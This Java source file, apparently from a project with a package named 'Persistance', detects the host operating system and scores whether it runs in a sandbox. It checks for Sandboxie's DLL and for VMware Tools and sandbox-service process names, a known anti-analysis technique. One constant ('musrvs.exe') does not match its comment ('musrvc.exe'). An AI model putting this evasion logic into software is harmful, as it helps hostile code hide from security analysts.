package Persistance;

import Persistance.Sandbox.SandboxWindowsDetector;

import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;

public class OSTools {
    private static final String OS_NAME = System.getProperty("os.name");

    public static final String PROCESSNAME_MUSRVC = "musrvs.exe";
    public static final String PROCESSNAME_BOXSERVICE = "boxservice.exe";
    public static final String PROCESSNAME_VMTOOLSD = "vmtoolsd.exe";


    public boolean isWindows() {
        return Boolean.TRUE.equals(OS_NAME.toLowerCase().contains("win"));
    }

    public boolean isLinux() {
        return Boolean.TRUE.equals(
                OS_NAME.toLowerCase().contains("nix")
                || OS_NAME.toLowerCase().contains("nux")
                || OS_NAME.toLowerCase().contains("aix"));
    }

    public boolean isMac() {
        return Boolean.TRUE.equals(OS_NAME.toLowerCase().contains("mac"));
    }

    public boolean isSolaris() {
        return Boolean.TRUE.equals(OS_NAME.toLowerCase().contains("sunos"));
    }

    public int scoreSandbox() {
        int score = 0;
        if (isWindows()) {
            SandboxWindowsDetector sandboxWindowsDetector  = new SandboxWindowsDetector();

            if (sandboxWindowsDetector.isSbiedll_dllPresent())
                score += 10;

            List<String> processList = getProcessList();
            for (String process : processList) {
                if (isSandboxProcess(process)) {
                    score += 10;
                }
            }
        }
        return score;
    }


    /*

    Process: musrvc.exe, boxservice.exe, or vmtoolsd.exe.

     */

    private List<String> getProcessList() {
        return  ProcessHandle.allProcesses()
                .map(processHandle -> processHandle.info().command())
                .filter(Optional::isPresent)
                .map(Optional::get)
                .collect(Collectors.toList());
    }

    private boolean isSandboxProcess(String processName) {
        return Boolean.TRUE.equals(processName.contains(PROCESSNAME_MUSRVC) ||
                        processName.contains(PROCESSNAME_BOXSERVICE) ||
                        processName.contains(PROCESSNAME_VMTOOLSD));
    }
}
